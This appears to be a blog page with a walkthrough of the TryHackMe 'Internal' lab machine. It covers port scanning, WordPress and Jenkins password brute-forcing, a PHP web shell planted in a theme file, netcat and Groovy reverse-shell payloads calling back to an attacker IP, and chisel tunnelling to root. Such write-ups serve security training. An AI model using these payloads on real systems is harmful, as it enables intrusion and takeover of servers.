<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>TryHackMe - Internal | Umar_0x01 â€“ Pentester | Programmer | Your average sakurity guy ( Í¡~ ÍœÊ– Í¡Â°)</title><meta name=keywords content="tryhackme,ssh,http,nmap,gobuster,wpscan,bruteforcing,rce,privesc,jenkins,groovy"><meta name=description content="Walkthrough of the machine Internal on TryHackMe - https://tryhackme.com/room/internal"><meta name=author content="Umar_0x01"><link rel=canonical href=https://umar0x01.sh/post/internal-thm/><meta name=google-site-verification content="GTM-TZKBTKP"><link crossorigin=anonymous href=/assets/css/stylesheet.min.8f5a9251d00d7a6a24c4b07dbf96a244b3ba30094a1dd1caa9e1d1bcc7238fe9.css integrity="sha256-j1qSUdANemokxLB9v5aiRLO6MAlKHdHKqeHRvMcjj+k=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.min.7680afc38aa6b15ddf158a4f3780b7b1f7dde7e91d26f073e6229bb7a0793c92.js integrity="sha256-doCvw4qmsV3fFYpPN4C3sffd5+kdJvBz5iKbt6B5PJI=" onload=hljs.initHighlightingOnLoad()></script><link rel=icon href=https://umar0x01.sh/favicon/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://umar0x01.sh/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://umar0x01.sh/favicon/favicon-32x32.png><link rel=apple-touch-icon href=https://umar0x01.sh/favicon/apple-touch-icon.png><link rel=mask-icon href=https://umar0x01.sh/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><meta name=generator content="Hugo 0.82.0"><script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(a,e,f,g,b,c,d){a.GoogleAnalyticsObject=b,a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},a[b].l=1*new Date,c=e.createElement(f),d=e.getElementsByTagName(f)[0],c.async=1,c.src=g,d.parentNode.insertBefore(c,d)}(window,document,'script','https://www.google-analytics.com/analytics.js','ga'),ga('create','UA-177361132-1','auto'),ga('send','pageview'))</script><meta property="og:title" content="TryHackMe - Internal"><meta property="og:description" content="Walkthrough of the machine Internal on TryHackMe - https://tryhackme.com/room/internal"><meta property="og:type" content="article"><meta property="og:url" content="https://umar0x01.sh/post/internal-thm/"><meta property="og:image" content="https://umar0x01.sh/images/internal-thm/Pasted%20image%2020210407143622.png"><meta property="article:section" content="post"><meta property="article:published_time" content="2021-04-07T00:00:00+00:00"><meta property="article:modified_time" content="2021-04-07T00:00:00+00:00"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://umar0x01.sh/images/internal-thm/Pasted%20image%2020210407143622.png"><meta name=twitter:title content="TryHackMe - Internal"><meta name=twitter:description content="Walkthrough of the machine Internal on TryHackMe - https://tryhackme.com/room/internal"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":2,"name":"Posts","item":"https://umar0x01.sh/post/"},{"@type":"ListItem","position":3,"name":"TryHackMe - Internal","item":"https://umar0x01.sh/post/internal-thm/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"TryHackMe - Internal","name":"TryHackMe - Internal","description":"Walkthrough of the machine Internal on TryHackMe - https://tryhackme.com/room/internal","keywords":["tryhackme","ssh","http","nmap","gobuster","wpscan","bruteforcing","rce","privesc","jenkins","groovy"],"articleBody":"Enumeration  IP: 10.10.25.58 Host: internal.thm\n Letâ€™s start with the nmap full port scan and see the open ports\nNmap full port scan â”Œâ”€â”€(rootðŸ’€b0x)-[/mnt/hgfs/THM/Internal] [7/117] â””â”€# nmap -p- -v -iL ip -oN nmapFullPort.nmap Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-07 13:15 PKT Initiating Ping Scan at 13:15 Scanning 10.10.25.58 [4 ports] Completed Ping Scan at 13:15, 0.22s elapsed (1 total hosts) Initiating SYN Stealth Scan at 13:15 Scanning internal.thm (10.10.25.58) [65535 ports] Discovered open port 80/tcp on 10.10.25.58 Discovered open port 22/tcp on 10.10.25.58 SYN Stealth Scan Timing: About 96.47% done; ETC: 13:34 (0:00:40 remaining) Completed SYN Stealth Scan at 13:35, 1181.13s elapsed (65535 total ports) Nmap scan report for internal.thm (10.10.25.58) Host is up (0.19s latency). Not shown: 65533 closed ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 1181.51 seconds Raw packets sent: 74888 (3.295MB) | Rcvd: 110353 (9.720MB) Enumerating HTTP Web Server (Port 80) Taking a look at port 80, we can see that / points to Apacheâ€™s default page. Letâ€™s try running gobuster against the web server:\nâ”Œâ”€â”€(rootðŸ’€b0x)-[/mnt/hgfs/THM/Internal] â””â”€# gobuster dir -u http://10.10.245.7 -w /usr/share/wordlists/dirb/big.txt -k -e -b 404 -t 100 1 â¨¯ =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.245.7 [+] Method: GET [+] Threads: 100 [+] Wordlist: /usr/share/wordlists/dirb/big.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Expanded: true [+] Timeout: 10s =============================================================== 2021/04/07 13:05:27 Starting gobuster in directory enumeration mode =============================================================== http://10.10.245.7/.htpasswd (Status: 403) [Size: 276] http://10.10.245.7/.htaccess (Status: 403) [Size: 276] http://10.10.245.7/blog (Status: 301) [Size: 309] [-- http://10.10.245.7/blog/] http://10.10.245.7/javascript (Status: 301) [Size: 315] [-- http://10.10.245.7/javascript/] http://10.10.245.7/phpmyadmin (Status: 301) [Size: 315] [-- http://10.10.245.7/phpmyadmin/] http://10.10.245.7/server-status (Status: 403) [Size: 276] http://10.10.245.7/wordpress (Status: 301) [Size: 314] [-- http://10.10.245.7/wordpress/]  =============================================================== 2021/04/07 13:06:13 Finished =============================================================== â€“\nVisiting /blog/ we can find that itâ€™s hosting wordpress. Letâ€™s run wpscan and see what we can enumerate.\nWpScan (/blog/) â”Œâ”€â”€(rootðŸ’€b0x)-[/mnt/hgfs/THM/Internal] â””â”€# wpscan --url http://internal.thm/blog/ -e u _______________________________________________________________ __ _______ _____ \\ \\ / / __ \\ / ____| \\ \\ /\\ / /| |__) | (___ ___ __ _ _ __ Â® \\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | '_ \\ \\ /\\ / | | ____) | (__| (_| | | | | \\/ \\/ |_| |_____/ \\___|\\__,_|_| |_| WordPress Security Scanner by the WPScan Team Version 3.8.17 Sponsored by Automattic - https://automattic.com/  @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart _______________________________________________________________ [+] URL: http://internal.thm/blog/ [10.10.25.58] [+] Started: Wed Apr 7 14:17:35 2021 Interesting Finding(s): [+] Headers | Interesting Entry: Server: Apache/2.4.29 (Ubuntu) | Found By: Headers (Passive Detection) | Confidence: 100% [+] XML-RPC seems to be enabled: http://internal.thm/blog/xmlrpc.php  | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: | - http://codex.wordpress.org/XML-RPC_Pingback_API  | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/  | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/  | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/  | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/ [+] WordPress readme found: http://internal.thm/blog/readme.html  | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] The external WP-Cron seems to be enabled: http://internal.thm/blog/wp-cron.php  | Found By: Direct Access (Aggressive Detection) | Confidence: 60% | References: | - https://www.iplocation.net/defend-wordpress-from-ddos  | - https://github.com/wpscanteam/wpscan/issues/1299 [+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10). | Found By: Rss Generator (Passive Detection) | - http://internal.thm/blog/index.php/feed/, https://wordpress.org/?v=5.4.2  | - http://internal.thm/blog/index.php/comments/feed/, https://wordpress.org/?v=5.4.2 [+] WordPress theme in use: twentyseventeen | Location: http://internal.thm/blog/wp-content/themes/twentyseventeen/  | Last Updated: 2021-03-09T00:00:00.000Z | Readme: http://internal.thm/blog/wp-content/themes/twentyseventeen/readme.txt  | [!] The version is out of date, the latest version is 2.6 | Style URL: http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507  | Style Name: Twenty Seventeen | Style URI: https://wordpress.org/themes/twentyseventeen/  | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo... | Author: the WordPress team | Author URI: https://wordpress.org/  | | Found By: Css Style In Homepage (Passive Detection) | | Version: 2.3 (80% confidence) | Found By: Style (Passive Detection) | - http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507, Match: 'Version: 2.3' [+] Enumerating Users (via Passive and Aggressive Methods) Brute Forcing Author IDs - Time: 00:00:00  (10 / 10) 100.00% Time: 00:00:00 [i] User(s) Identified: [+] admin | Found By: Author Posts - Author Pattern (Passive Detection) | Confirmed By: | Rss Generator (Passive Detection) | Wp Json Api (Aggressive Detection) | - http://internal.thm/blog/index.php/wp-json/wp/v2/users/?per_page=100\u0026page=1  | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection) [!] No WPScan API Token given, as a result vulnerability data has not been output. [!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register [+] Finished: Wed Apr 7 14:17:39 2021 [+] Requests Done: 13 [+] Cached Requests: 48 [+] Data Sent: 3.457 KB [+] Data Received: 9.149 KB [+] Memory used: 167 MB [+] Elapsed time: 00:00:03 We can see that admin user exists in the application. Letâ€™s use rockyou.txt wordlist for bruteforcing.\nâ”Œâ”€â”€(rootðŸ’€b0x)-[/mnt/hgfs/THM/Internal] [475/528] â””â”€# wpscan --url http://internal.thm/blog/ -v -e u -P /usr/share/wordlists/rockyou.txt -t 500 2 â¨¯ _______________________________________________________________ __ _______ _____ \\ \\ / / __ \\ / ____| \\ \\ /\\ / /| |__) | (___ ___ __ _ _ __ Â® \\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | '_ \\ \\ /\\ / | | ____) | (__| (_| | | | | \\/ \\/ |_| |_____/ \\___|\\__,_|_| |_| WordPress Security Scanner by the WPScan Team Version 3.8.17 Sponsored by Automattic - https://automattic.com/  @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart _______________________________________________________________ [+] URL: http://internal.thm/blog/ [10.10.25.58] [+] Started: Wed Apr 7 14:09:25 2021 Interesting Finding(s): [+] Headers | Interesting Entry: Server: Apache/2.4.29 (Ubuntu) | Found By: Headers (Passive Detection) | Confidence: 100% [+] XML-RPC seems to be enabled: http://internal.thm/blog/xmlrpc.php  | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: | - http://codex.wordpress.org/XML-RPC_Pingback_API  | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/  | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/  | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/  | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/ [+] WordPress readme found: http://internal.thm/blog/readme.html  | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] The external WP-Cron seems to be enabled: http://internal.thm/blog/wp-cron.php  | Found By: Direct Access (Aggressive Detection) | Confidence: 60% | References: | - https://www.iplocation.net/defend-wordpress-from-ddos  | - https://github.com/wpscanteam/wpscan/issues/1299 [+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10). | Found By: Rss Generator (Passive Detection) | - http://internal.thm/blog/index.php/feed/, https://wordpress.org/?v=5.4.2 [426/528]  | - http://internal.thm/blog/index.php/comments/feed/, https://wordpress.org/?v=5.4.2 [+] WordPress theme in use: twentyseventeen | Location: http://internal.thm/blog/wp-content/themes/twentyseventeen/  | Last Updated: 2021-03-09T00:00:00.000Z | Readme: http://internal.thm/blog/wp-content/themes/twentyseventeen/readme.txt  | [!] The version is out of date, the latest version is 2.6 | Style URL: http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507  | Style Name: Twenty Seventeen | Style URI: https://wordpress.org/themes/twentyseventeen/  | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a focus on business sites, it features multiple sections on the front page as well as widgets, navi gation and social menus, a logo, and more. Personalize its asymmetrical grid with a custom color scheme and showcase your multimedia content with post formats. Our default theme for 2017 works great in many lang uages, for any abilities, and on any device. | Author: the WordPress team | Author URI: https://wordpress.org/  | License: GNU General Public License v2 or later | License URI: http://www.gnu.org/licenses/gpl-2.0.html  | Tags: one-column, two-columns, right-sidebar, flexible-header, accessibility-ready, custom-colors, custom-header, custom-menu, custom-logo, editor-style, featured-images, footer-widgets, post-formats, rtl-lan guage-support, sticky-post, theme-options, threaded-comments, translation-ready | Text Domain: twentyseventeen | | Found By: Css Style In Homepage (Passive Detection) | | Version: 2.3 (80% confidence) | Found By: Style (Passive Detection) | - http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507, Match: 'Version: 2.3' [+] Enumerating Users (via Passive and Aggressive Methods) Brute Forcing Author IDs - Time: 00:00:04  (10 / 10) 100.00% Time: 00:00:04 [i] User(s) Identified: [+] admin | Found By: Author Posts - Author Pattern (Passive Detection) | Confirmed By: | Rss Generator (Passive Detection) | Wp Json Api (Aggressive Detection) | - http://internal.thm/blog/index.php/wp-json/wp/v2/users/?per_page=100\u0026page=1  | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection) [+] Performing password attack on Xmlrpc against 1 user/s [SUCCESS] - admin / ... Trying admin / timmy1 Time: 00:01:35 (4000 / 14348392) 0.02% ETA: ??:??:?? [!] Valid Combinations Found: | Username: admin, Password: ... [!] No WPScan API Token given, as a result vulnerability data has not been output. [!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register [+] Finished: Wed Apr 7 14:11:21 2021 [+] Requests Done: 4056 [+] Cached Requests: 7 [+] Data Sent: 2.022 MB [+] Data Received: 2.759 MB [+] Memory used: 186.539 MB [+] Elapsed time: 00:01:55 Got hit around 4000 tries, we get credentials of the user admin\nadmin:...\n Exploitation Letâ€™s now try and login and get reverse shell on our machine. Iâ€™ll be editing the theme file (404.php) and add the following for rce:\nphp system($_GET[123]); ?Added the snippet for getting RCE\nNow, we need to visit a 404 page on the application to get RCE! We do so by finding a legit blog post and just changing the URL.\nRCE Reverse Shell time! Alright, time to get reverse shell, letâ€™s see if weâ€™ve nc on the host. Can do so by using which\nwhich nc Alright, nc exists. We can utilize the following to get reverse shell:\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2\u00261|nc 10.17.0.120 4444 /tmp/f Letâ€™s URL encode it before using, since due to \u0026 the payload might not execute. We can use cyberchef for doing so.\nRemember to encode all special characters as well!\nrm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20%2Di%202%3E%261%7Cnc%2010%2E17%2E0%2E120%204444%20%3E%2Ftmp%2Ff Letâ€™s get RCE now, first start listener on local 4444 port.\nhttp://internal.thm/blog/index.php/2020/08/04/hello-world/?123=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20%2Di%202%3E%261%7Cnc%2010%2E17%2E0%2E120%204444%20%3E%2Ftmp%2Ff Got reverse shell! Beautified and made it interactive as well.\n Privileges Escalation Alright, we got shell as www-data user and canâ€™t really find any flags. Also, thereâ€™s a user in /home/aubreanna\nLooking at the processes we can see that it has one java service running:\nwww-data@internal:/var/www/html/wordpress$ ps aux | grep aubrean aubrean+ 1540 0.0 0.0 1148 4 ? Ss 09:07 0:00 /sbin/tini -- /usr/local/bin/jenkins.sh aubrean+ 1574 1.7 12.0 2587808 245668 ? Sl 09:07 0:23 java -Duser.home=/var/jenkins_home -Djenkins.model.Jenkins.slaveAgentPort=50000 -jar /usr/share/jenkins/jenkins.war aubrean+ 1612 0.0 0.0 0 0 ? Z 09:07 0:00 [jenkins.sh]  www-data 5586 0.0 0.0 11464 1100 pts/0 S+ 09:29 0:00 grep --color=auto aubrean Letâ€™s see the local listening ports:\nwww-data@internal:/var/www/html/wordpress$ netstat -plnt (Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.) Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 127.0.0.1:33897 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:8080 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - tcp6 0 0 :::80 :::* LISTEN - tcp6 0 0 :::22 :::* LISTEN - Port 8080 is listening locally, letâ€™s try and cURL and see the repsonse it.\nwww-data@internal:/var/www/html/wordpress$ curl -i http://127.0.0.1:8080 HTTP/1.1 403 Forbidden Date: Wed, 07 Apr 2021 09:30:54 GMT X-Content-Type-Options: nosniff Set-Cookie: JSESSIONID.992b29b3=node01ii80j993afao35bpvwstyvpu0.node0; Path=/; HttpOnly Expires: Thu, 01 Jan 1970 00:00:00 GMT Content-Type: text/html;charset=utf-8 X-Hudson: 1.395 X-Jenkins: 2.250 X-Jenkins-Session: 56d53c37 X-Hudson-CLI-Port: 50000 X-Jenkins-CLI-Port: 50000 X-Jenkins-CLI2-Port: 50000 X-You-Are-Authenticated-As: anonymous X-You-Are-In-Group-Disabled: JENKINS-39402: use -Dhudson.security.AccessDeniedException2.REPORT_GROUP_HEADERS=true or use /whoAmI to diagnose X-Required-Permission: hudson.model.Hudson.Read X-Permission-Implied-By: hudson.security.Permission.GenericRead X-Permission-Implied-By: hudson.model.Hudson.Administer Content-Length: 793 Server: Jetty(9.4.30.v20200611) 'refresh' content='1;url=/login?from=%2F'/window.location.replace('/login?from=%2F');'background-color:white; color:white;' Authentication required as: anonymous Groups that you are in: Permission you need to have (but didn't): hudson.model.Hudson.Read ... which is implied by: hudson.security.Permission.GenericRead ... which is implied by: hudson.model.Hudson.Administer --  â€“\nPort Forwarding (8080) Interesting, letâ€™s try and do port forwarding utilziing chisel and access the port locally on our own attacker machine.\nWe can do so by doing the following on attacker/victim machines:\nVictim:\nwww-data@internal:/tmp$ ./chisel-umar0x01 server -p 47000 2021/04/07 09:34:08 server: Fingerprint auG3MXyqO68Dyisj38bk+g/QRvnlc/xVxcjh/ulpye4= 2021/04/07 09:34:08 server: Listening on http://0.0.0.0:47000 Attacker:\nâ”Œâ”€â”€(rootðŸ’€b0x)-[/var/www/html] â””â”€# ./chisel-umar0x01 client 10.10.25.58:47000 2222:127.0.0.1:8080 127 â¨¯ 2021/04/07 14:35:23 client: Connecting to ws://10.10.25.58:47000 2021/04/07 14:35:23 client: tun: proxy#2222=8080: Listening 2021/04/07 14:35:24 client: Connected (Latency 187.684044ms) â€“\nWe got the connection:\nNow, letâ€™s connect to the localhost port 2222 and see if we can access the forwarded port.\nAlright, the port was hosting jenkins!\nAgain the login form! :|\nLetâ€™s run hydra for jenkins bruteforcing!\nâ”Œâ”€â”€(rootðŸ’€b0x)-[/mnt/hgfs/THM/Internal] â””â”€# hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 -s 2222 http-post-form '/j_acegi_security_check:j_username=^USER^\u0026j_password=^PASS^\u0026from=%2F\u0026Submit=Sign+in:F=Invalid' -I 130 â¨¯ Hydra v9.1 (c) 2020 by van Hauser/THC \u0026 David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-04-07 15:05:14 [INFO] Using HTTP Proxy: http://127.0.0.1:8080 [WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore [DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task [DATA] attacking http-post-form://127.0.0.1:2222/j_acegi_security_check:j_username=^USER^\u0026j_password=^PASS^\u0026from=%2F\u0026Submit=Sign+in:F=Invalid [2222][http-post-form] host: 127.0.0.1 login: admin password: ... 1 of 1 target successfully completed, 1 valid password found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-04-07 15:05:40 http://127.0.0.1:2222/script\nadmin:...\nGetting code execution on Jenkins, we know that it supports groovy script execution.\ndef command = \"cat /etc/passwd\" def proc = command.execute() proc.waitFor() println \"Std Out: ${proc.in.text}\" The above doesnâ€™t work due to some reason for reverse shell. We can use the following snippet from this gist.\nString host=\"10.17.0.120\"; int port=4444; String cmd=\"/bin/bash\"; Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()0)so.write(pi.read());while(pe.available()0)so.write(pe.read());while(si.available()0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close(); Got shell!\n Enumerating the container found /opt/note.txt. It contained the following:\njenkins@jenkins:/opt$ cat note.txt cat note.txt Aubreanna, Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here. Use them if you need access to the root user account. root:...  Getting root! Now, letâ€™s try the following credentials as the root user.\nwww-data@internal:/tmp$ su - root Password: root@internal:~# root@internal:~# id uid=0(root) gid=0(root) groups=0(root) root@internal:~# head /etc/shadow root:...:18477:0:99999:7::: daemon:*:18295:0:99999:7::: r00t! This machine was purely based on enumeration. Hopefully, you enjoyed reading the walkthrough!\n","wordCount":"2246","inLanguage":"en","image":"https://umar0x01.sh/images/internal-thm/Pasted%20image%2020210407143622.png","datePublished":"2021-04-07T00:00:00Z","dateModified":"2021-04-07T00:00:00Z","author":{"@type":"Person","name":"Umar_0x01"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://umar0x01.sh/post/internal-thm/"},"publisher":{"@type":"Organization","name":"Umar_0x01 â€“ Pentester | Programmer | Your average sakurity guy ( Í¡~ ÍœÊ– Í¡Â°)","logo":{"@type":"ImageObject","url":"https://umar0x01.sh/favicon/favicon.ico"}}}</script></head><body class=dark id=top><script>localStorage.getItem("pref-theme")==="light"&&document.body.classList.remove('dark')</script><noscript><style type=text/css>#theme-toggle,.top-link{display:none}</style></noscript><header class=header><nav class=nav><div class=logo><a class=label_text_header href=https://umar0x01.sh accesskey=h title="> umar_0x01 | blog (Alt + H)"><span id=cusor_blink>></span> umar_0x01 | blog</a>
<span class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></span></div><ul id=menu onscroll=menu_on_scroll()><li><a href=https://umar0x01.sh/archives/ title=Posts><span>Posts</span></a></li><li><a href=https://umar0x01.sh/anime/ title=Anime><span>Anime</span></a></li><li><a href=https://umar0x01.sh/categories/ title=Categories><span>Categories</span></a></li><li><a href=https://umar0x01.sh/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li><li><a href=https://umar0x01.sh/tags/ title=Tags><span>Tags</span></a></li></ul></nav><script type=text/javascript>var cursor=!0,speed=400;setInterval(()=>{cursor?(document.getElementById('cusor_blink').style.opacity=0,cursor=!1):(document.getElementById('cusor_blink').style.opacity=1,cursor=!0)},speed)</script></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://umar0x01.sh>Home</a>&nbsp;Â»&nbsp;<a href=https://umar0x01.sh/post/>Posts</a></div><h1 class=post-title>TryHackMe - Internal</h1><div class=post-description>Walkthrough of the machine Internal on TryHackMe - https://tryhackme.com/room/internal</div><div class=post-meta>April 7, 2021&nbsp;Â·&nbsp;11 min&nbsp;Â·&nbsp;Umar_0x01</div></header><div class=post-content><h2 id=enumeration>Enumeration<a hidden class=anchor aria-hidden=true href=#enumeration>#</a></h2><hr><p><strong>IP:</strong> 10.10.25.58
<strong>Host:</strong> internal.thm</p><hr><p>Let&rsquo;s start with the nmap full port scan and see the open ports</p><h3 id=nmap-full-port-scan>Nmap full port scan<a hidden class=anchor aria-hidden=true href=#nmap-full-port-scan>#</a></h3><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-csharp data-lang=csharp><span style=color:#960050;background-color:#1e0010>â”Œâ”€â”€</span>(root<span style=color:#960050;background-color:#1e0010>ðŸ’€</span>b0x)-[/mnt/hgfs/THM/Internal]                                                                                                                                                                     [<span style=color:#ae81ff>7</span>/<span style=color:#ae81ff>117</span>]
<span style=color:#960050;background-color:#1e0010>â””â”€#</span> nmap -p- -v -iL ip -oN nmapFullPort.nmap                                                                                                                                                                       
Starting Nmap <span style=color:#ae81ff>7.91</span> ( https:<span style=color:#75715e>//nmap.org ) at 2021-04-07 13:15 PKT                                          
</span><span style=color:#75715e></span>Initiating Ping Scan at <span style=color:#ae81ff>13</span>:<span style=color:#ae81ff>15</span>                       
Scanning <span style=color:#ae81ff>10.10</span>.<span style=color:#ae81ff>25.58</span> [<span style=color:#ae81ff>4</span> ports]                                                                           
Completed Ping Scan at <span style=color:#ae81ff>13</span>:<span style=color:#ae81ff>15</span>, <span style=color:#ae81ff>0.22</span>s elapsed (<span style=color:#ae81ff>1</span> total hosts)                                              
Initiating SYN Stealth Scan at <span style=color:#ae81ff>13</span>:<span style=color:#ae81ff>15</span>                
Scanning <span style=color:#66d9ef>internal</span>.thm (<span style=color:#ae81ff>10.10</span>.<span style=color:#ae81ff>25.58</span>) [<span style=color:#ae81ff>65535</span> ports]                                                        
Discovered open port <span style=color:#ae81ff>80</span>/tcp <span style=color:#66d9ef>on</span> <span style=color:#ae81ff>10.10</span>.<span style=color:#ae81ff>25.58</span>          
Discovered open port <span style=color:#ae81ff>22</span>/tcp <span style=color:#66d9ef>on</span> <span style=color:#ae81ff>10.10</span>.<span style=color:#ae81ff>25.58</span>         
SYN Stealth Scan Timing: About <span style=color:#ae81ff>96.47</span>% done; ETC: <span style=color:#ae81ff>13</span>:<span style=color:#ae81ff>34</span> (<span style=color:#ae81ff>0</span>:<span style=color:#ae81ff>00</span>:<span style=color:#ae81ff>40</span> remaining)                               
Completed SYN Stealth Scan at <span style=color:#ae81ff>13</span>:<span style=color:#ae81ff>35</span>, <span style=color:#ae81ff>1181.13</span>s elapsed (<span style=color:#ae81ff>65535</span> total ports)                                
Nmap scan report <span style=color:#66d9ef>for</span> <span style=color:#66d9ef>internal</span>.thm (<span style=color:#ae81ff>10.10</span>.<span style=color:#ae81ff>25.58</span>)                                                          
Host <span style=color:#66d9ef>is</span> up (<span style=color:#ae81ff>0.19</span>s latency).                         
Not shown: <span style=color:#ae81ff>65533</span> closed ports                       
PORT   STATE SERVICE                                
<span style=color:#ae81ff>22</span>/tcp open  ssh                                    
<span style=color:#ae81ff>80</span>/tcp open  http                                   

Read data files <span style=color:#66d9ef>from</span>: /usr/bin/../share/nmap        
Nmap done: <span style=color:#ae81ff>1</span> IP address (<span style=color:#ae81ff>1</span> host up) scanned <span style=color:#66d9ef>in</span> <span style=color:#ae81ff>1181.51</span> seconds                                           
           Raw packets sent: <span style=color:#ae81ff>74888</span> (<span style=color:#ae81ff>3.295</span>MB) | Rcvd: <span style=color:#ae81ff>110353</span> (<span style=color:#ae81ff>9.720</span>MB)                                    

</code></pre></div><h3 id=enumerating-http-web-server-port-80>Enumerating HTTP Web Server (Port 80)<a hidden class=anchor aria-hidden=true href=#enumerating-http-web-server-port-80>#</a></h3><p>Taking a look at <code>port 80</code>, we can see that <code>/</code> points to Apache&rsquo;s default page. Let&rsquo;s try running gobuster against the web server:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-csharp data-lang=csharp><span style=color:#960050;background-color:#1e0010>â”Œâ”€â”€</span>(root<span style=color:#960050;background-color:#1e0010>ðŸ’€</span>b0x)-[/mnt/hgfs/THM/Internal]                                                                                                                                                                            
<span style=color:#960050;background-color:#1e0010>â””â”€#</span> gobuster dir -u http:<span style=color:#75715e>//10.10.245.7 -w /usr/share/wordlists/dirb/big.txt -k -e -b 404 -t 100                                                                                       1 â¨¯                          
</span><span style=color:#75715e></span>===============================================================                                                                                                                                                    
